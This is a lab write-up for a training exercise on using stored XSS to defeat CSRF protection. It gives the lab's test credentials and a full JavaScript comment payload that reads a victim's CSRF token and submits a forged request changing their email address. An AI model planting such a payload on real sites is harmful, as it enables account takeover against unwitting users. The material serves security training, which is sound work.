# Lab 6: Exploiting XSS to bypass CSRF defenses

Exploit stored XSS to extract a victimâ€™s CSRF token and change their email address when they view your comment.

---

## ğŸ” Credentials

- **Username:** `wiener`
- **Password:** `peter`

---

## ğŸ’¡ Hint

- You cannot register an email address already in use.
- When testing, use **unique email addresses** before final deployment to the victim.

---

## ğŸ§ª Lab Solution Steps

### 1ï¸âƒ£ Log In and Inspect Email Change Functionality

- Log into your account using the credentials above.
- Navigate to the **"My Account"** page.
- View the source of the page â€” you will discover:
    - ğŸ“¥ A POST request to `/my-account/change-email`
    - ğŸ”‘ A hidden CSRF token input:
        
        ```html
        <input type="hidden" name="csrf" value="...">
        
        ```
        

---

### 2ï¸âƒ£ Craft the Stored XSS Payload

- Submit this payload in a **blog comment** field:

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&email=test@test.com');
};
</script>

```

### ğŸ§  What It Does:

- Makes a **GET** request to `/my-account`
- Extracts the CSRF token from the response
- Uses the token to **submit a forged POST** request to update the victim's email address

---

## âœ… Goal

When a **victim user** views the comment:

- Their browser executes your payload
- Their **email gets changed** to `test@test.com`
- ğŸ‰ The lab is solved

---

## ğŸ¥ Community Solution

> ğŸ“º Watch on YouTube: 
[https://youtu.be/DWThhRPwGEg](https://youtu.be/DWThhRPwGEg)
>